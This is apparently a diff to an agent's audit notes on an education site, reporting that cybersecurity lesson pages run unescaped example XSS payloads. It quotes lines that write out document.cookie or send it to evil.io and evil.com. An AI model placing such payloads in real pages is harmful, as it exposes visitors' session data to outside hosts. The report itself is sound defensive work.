@@ -129,6 +129,41 @@ question that is in fact locked. Rewritten to report WHICH option.
   structure Tanner says carried the site last spring, and it is the one shape
   cyber does not have.
 
+## The one that was not on his list
+
+Scanning all 730 crawled pages with `tools/scan-inline-scripts.py` found **7
+pages whose inline scripts a browser cannot parse**, confirmed by loading each in
+Chromium. Five are AP Cybersecurity Unit 5, which is the content Tanner wants
+mature for spring.
+
+The cause on those five is not an injected newline. The lesson pages show
+example attack payloads inside `<code>` blocks and the example `<script>` tags
+were never escaped to `&lt;script&gt;`. There are ZERO escaped ones on these
+pages. So the HTML parser builds REAL script elements and the browser runs them:
+
+    ap-cyber-unit-5-lesson-6             document.write(document.cookie)
+    ap-cyber-unit-5-lesson-6             fetch('evil.io/c?'+document.cookie)
+    ap-cyber-unit-5-lesson-1-exercise-1  fetch('evil.com/c='+document.cookie)
+    ap-cyber-unit-5-exam                 stealCookies()   undefined, throws
+
+Four more payloads throw because they are URL encoded.
+
+Severity, stated rather than implied: `apcse_token` is in localStorage and the
+Shopify session cookie is HttpOnly, so neither is reachable from
+`document.cookie`. What does leave are the Shopify analytics and cart
+identifiers, to two domains this business does not own and anyone can register.
+`document.write` also corrupts the surrounding lesson, which is why those pages
+throw further errors and why the examples a student is meant to READ are missing.
+
+Filed as board 177. The repair is escaping, and it belongs to a human because
+recovering each example means knowing what it was meant to display.
+
+My own labelling was wrong first here too. A regex called
+`fetch('evil.io/c?'+document.cookie)` inert because `+document` looked like URL
+encoding. It is ordinary string concatenation and the browser runs it. Parsing
+each payload with `vm.Script` instead of pattern matching moved the count of
+executing payloads from 1 to 4.
+
 ## What no measurement settles, and why I stopped
 
 Four of these are product decisions and I did not pick one:
